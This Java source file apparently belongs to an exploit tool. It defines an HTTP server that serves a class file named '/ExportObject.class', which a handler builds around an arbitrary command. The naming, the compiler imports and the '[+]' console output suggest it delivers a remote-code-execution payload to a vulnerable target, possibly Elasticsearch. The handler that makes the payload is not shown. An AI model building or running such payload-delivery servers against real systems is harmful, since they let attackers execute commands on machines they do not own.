package gds.els;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;

import org.apache.commons.io.IOUtils;

import com.sun.net.httpserver.HttpServer;

public class MyHttpServer {

	private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
			
	public static void run(InetAddress host, int port, String command) {

		try {
			HttpServer httpServer = HttpServer.create(new InetSocketAddress(host, port), 0);
			httpServer.createContext("/ExportObject.class", new HttpFileHandler(command));
			httpServer.setExecutor(null);
			httpServer.start();
			System.out.println("[+] HTTP server listening on " + host.getHostAddress() + ":" + port);
		} catch (IOException e) {
			System.out.println("[-] Exception: " + e.getMessage());
			e.printStackTrace();
			System.out.println(5);
		}

	}

}
